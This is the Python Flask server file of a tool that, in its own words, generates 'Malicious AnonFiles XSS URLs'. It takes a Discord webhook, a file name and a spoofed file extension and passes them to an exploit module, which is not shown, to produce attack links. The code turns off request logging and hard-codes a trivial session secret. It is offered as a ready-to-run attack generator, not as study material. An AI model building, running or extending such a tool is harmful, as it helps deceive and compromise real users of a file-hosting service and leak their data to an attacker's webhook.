#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: main.py
"""

import logging

from core.exploit import *

from flask import Flask, request, session, render_template


class App:
    """Flask App & API for managing and generating Malicious AnonFiles XSS URLs"""

    def __init__(self):
        print(" * Starting server on http://localhost")
        app = Flask("AnonFiles XSS Generator",
                    static_url_path='', 
                    static_folder='frontend/static',
                    template_folder='frontend/templates')

        log = logging.getLogger('werkzeug')
        log.disabled = True

        @app.route("/", methods=["GET"])
        def dashboard():
            """get session data and render the dashboard template"""
            try:
                alert = session['alert']
                url = session['url']
            except KeyError:
                alert = ""
                url = ""

            return render_template("index.html", alert=alert, url=url)

        @app.route("/api/generate-url", methods=["POST"])
        def generate_url():
            """generate malicious AnonFiles URL through core.exploit.generate

            :data str webhook: discord webhook to post to
            :data str file_name: file name to host
            :data str file_extension: file extension to spoof
            """
            webhook = request.form.get("discordwebhook")
            name = request.form.get("filename")
            extension = request.form.get("filextension")

            generation = generate(webhook=webhook, file_name=name, file_extension=extension)
            alert, malicious_url = generation
            session['alert'] = alert
            session['url'] = malicious_url

            return dashboard()

        app.secret_key = "None"
        app.run(host="0.0.0.0", port=80, debug=False, use_reloader=False)


if __name__ == '__main__':
    App()